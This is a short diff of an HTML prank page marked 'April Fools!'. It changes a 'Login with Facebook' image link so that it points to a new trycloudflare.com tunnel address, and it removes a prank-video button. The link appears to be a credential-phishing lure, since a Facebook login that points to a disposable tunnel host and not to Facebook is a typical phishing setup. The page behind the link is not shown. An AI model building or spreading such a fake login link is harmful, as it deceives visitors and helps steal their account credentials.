@@ -35,8 +35,7 @@
     <p>April Fools!</p>
     <p>GGS MFS</p>
     <p>Don't forget to log in with Facebook!</p>
-    <a href="https://gale-announcement-namibia-english.trycloudflare.com"><img src="facebook_logo.png" alt="Login with Facebook" width="150"></a>
-    <button class="button" onclick="window.location.href='https://www.youtube.com/watch?v=dQw4w9WgXcQ';">Click Here</button>
+    <a href="https://ordering-fear-estimates-hope.trycloudflare.com"><img src="facebook_logo.png" alt="Login with Facebook" width="150"></a>
   </div>
 </body>
 </html>
